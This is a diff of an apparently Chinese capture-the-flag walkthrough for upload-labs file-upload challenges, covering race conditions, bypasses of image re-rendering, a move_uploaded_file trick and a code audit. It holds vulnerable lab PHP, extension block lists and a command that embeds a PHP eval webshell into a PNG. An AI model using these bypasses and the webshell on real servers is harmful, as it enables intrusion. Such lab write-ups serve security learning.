+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">);</span>
@@ -689,34 +528,10 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="条件竞争">条件竞争</h3>
+</span></span></code></pre></div><h3 id="条件竞争">条件竞争</h3>
 <p>其实根据提醒我们已经可以有一个明确的思路了，就是我们利用系统一次只能处理一件事情的特性，通过同时发起上传以及访问的请求，导致服务器还来不及处理删除却先执行访问，导致webshell的写入 <!-- raw HTML omitted --></p>
 <p>我们在结合源码来看，这里采用了白名单的手段避免了任何的绕过，所以我们来利用条件竞争来尝试绕过 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$upload_file</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
@@ -734,9 +549,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们通过Burp的Intruder进行无限制的请求，一边上传文件，这将触发服务器进行审核以及删除，一边访问 <code>shell.php</code> 来调用，最终服务器会因为来不及删除而导致webshell被成功调用， <code>trojan.php</code> 被写入。 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>我们通过Burp的Intruder进行无限制的请求，一边上传文件，这将触发服务器进行审核以及删除，一边访问 <code>shell.php</code> 来调用，最终服务器会因为来不及删除而导致webshell被成功调用， <code>trojan.php</code> 被写入。 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-04-30_16-12-33_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
@@ -751,19 +564,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <h3 id="二次渲染">二次渲染</h3>
 <p>根据提示信息，我们知道我们所上传的图片马会被二次渲染，导致失效，因此我们分不同的图片格式来绕过 <!-- raw HTML omitted -->
 同时我们点击查看提示的按钮，可以发现url发生了变化，结合源码，我们发现这里可以用来解析我们上传成功绕过渲染的图片马，形成文件上传漏洞 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;btn btn-success&#34;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="o">&gt;</span><span class="nx">点击查看</span> <span class="nx">“提示”</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;btn btn-success&#34;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="o">&gt;</span><span class="nx">点击查看</span> <span class="nx">“提示”</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;lead&#34;</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢？</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
@@ -771,47 +572,9 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-success&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="p">&gt;</span>点击查看 “提示”<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="gif">GIF</h4>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;gif&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/gif&#34;</span><span class="p">)){</span>
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-success&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="p">&gt;</span>点击查看 “提示”<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h4 id="gif">GIF</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;gif&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/gif&#34;</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">         <span class="c1">//使用上传的图片生成新的图片
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromgif</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
@@ -836,9 +599,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们用 <code>Hex Friend</code> 对比一下原gif和上传后二次渲染的gif <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>我们用 <code>Hex Friend</code> 对比一下原gif和上传后二次渲染的gif <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/gif.gif" width="100px"/>
 </figure>
  <!-- raw HTML omitted --></p>
@@ -856,33 +617,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </figure>
  <!-- raw HTML omitted --></p>
 <h4 id="png">PNG</h4>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;png&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/png&#34;</span><span class="p">)){</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;png&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/png&#34;</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">         <span class="c1">//使
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
@@ -904,9 +639,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><!-- raw HTML omitted -->
+</span></span></code></pre></div><!-- raw HTML omitted -->
 <ul>
 <li>
 <p>前置知识</p>
@@ -950,25 +683,11 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
     </figure>
  <!-- raw HTML omitted --></p>
 <p>我们可以先利用imagemagick将图片转换为索引图像/基于调色板图像（Palette-based images） <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">convert png.png -type Palette png_trojan.png
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>之后使用<a class="link" href="https://github.com/hxer/imagecreatefrom-"  target="_blank" rel="noopener"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">convert png.png -type Palette png_trojan.png
+</span></span></code></pre></div><p>之后使用<a class="link" href="https://github.com/hxer/imagecreatefrom-"  target="_blank" rel="noopener"
     >脚本</a>来进行一句话木马的输入 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 poc_png.py -p <span class="s1">&#39;&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;&#39;</span> -o png_trojan.png png_trojan.png
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><figure><img src="/ox-hugo/2022-05-01_22-42-09_screenshot.png" width="700px"/>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 poc_png.py -p <span class="s1">&#39;&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;&#39;</span> -o png_trojan.png png_trojan.png
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-01_22-42-09_screenshot.png" width="700px"/>
     </figure>
  <!-- raw HTML omitted --></p>
 <p>尝试上传 <!-- raw HTML omitted --></p>
@@ -994,33 +713,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </li>
 </ul>
 <h4 id="jpg">JPG</h4>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;jpg&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">)){</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;jpg&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">                     <span class="c1">//使用上传的图片生成新的图片
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
@@ -1042,24 +735,15 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">                <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们首先上传一张图片 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>我们首先上传一张图片 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/1603669426842.jpg" width="400px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <p>然后下载二次渲染之后的图片，用脚本注入php payload（可以改一下注入的payload）： <a class="link" href="https://github.com/BlackFan/jpg_payload"  target="_blank" rel="noopener"
     >BlackFan / <!-- raw HTML omitted -->
 jpg_payload</a>  <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">php php jpg_payload.php <span class="o">[</span>uploaded_jpg_image<span class="o">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后我们检查payload是否注入成功 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">php php jpg_payload.php <span class="o">[</span>uploaded_jpg_image<span class="o">]</span>
+</span></span></code></pre></div><p>然后我们检查payload是否注入成功 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-03_11-59-57_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
@@ -1084,30 +768,7 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 <h3 id="move-uploaded-file-绕过">move_uploaded_file 绕过</h3>
 <p>我们看一下源码先 <!-- raw HTML omitted --></p>
 <p>发现是一个白名单，那么肯定又需要利用一些有漏洞的方法或者操作系统的特殊机制了 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;php5&#34;</span><span class="p">,</span><span class="s2">&#34;php4&#34;</span><span class="p">,</span><span class="s2">&#34;php3&#34;</span><span class="p">,</span><span class="s2">&#34;php2&#34;</span><span class="p">,</span><span class="s2">&#34;html&#34;</span><span class="p">,</span><span class="s2">&#34;htm&#34;</span><span class="p">,</span><span class="s2">&#34;phtml&#34;</span><span class="p">,</span><span class="s2">&#34;pht&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;jspa&#34;</span><span class="p">,</span><span class="s2">&#34;jspx&#34;</span><span class="p">,</span><span class="s2">&#34;jsw&#34;</span><span class="p">,</span><span class="s2">&#34;jsv&#34;</span><span class="p">,</span><span class="s2">&#34;jspf&#34;</span><span class="p">,</span><span class="s2">&#34;jtml&#34;</span><span class="p">,</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;asa&#34;</span><span class="p">,</span><span class="s2">&#34;asax&#34;</span><span class="p">,</span><span class="s2">&#34;ascx&#34;</span><span class="p">,</span><span class="s2">&#34;ashx&#34;</span><span class="p">,</span><span class="s2">&#34;asmx&#34;</span><span class="p">,</span><span class="s2">&#34;cer&#34;</span><span class="p">,</span><span class="s2">&#34;swf&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
@@ -1126,9 +787,7 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里的漏洞在<a class="link" href="https://www.smi1e.top/2019/02/07/upload-labs-20%E5%85%B3%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/#Pass-09-%E7%A9%BA%E6%A0%BC-%E7%BB%95%E8%BF%87"  target="_blank" rel="noopener"
+</span></span></code></pre></div><p>这里的漏洞在<a class="link" href="https://www.smi1e.top/2019/02/07/upload-labs-20%E5%85%B3%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/#Pass-09-%E7%A9%BA%E6%A0%BC-%E7%BB%95%E8%BF%87"  target="_blank" rel="noopener"
     >Smile师傅的笔记</a>中有提到，即 <code>move_uploaded_file</code> 会忽略/. <!-- raw HTML omitted --></p>
 <p>那么我们通过构造文件名为 <code>trojan.php/.</code> 即可绕过白名单，同时使webshell被正常解析 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-03_12-19-13_screenshot.png" width="700px"/>
@@ -1137,45 +796,7 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 <p>蚁剑连接成功 <!-- raw HTML omitted --></p>
 <h3 id="代码审计">代码审计</h3>
 <p>因为是代码审计，我们直接来看代码 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">])){</span>
@@ -1209,23 +830,12 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;请选择要上传的文件！&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们接着一块块来看源码中的审核机制以及我们对应的绕过 <!-- raw HTML omitted --></p>
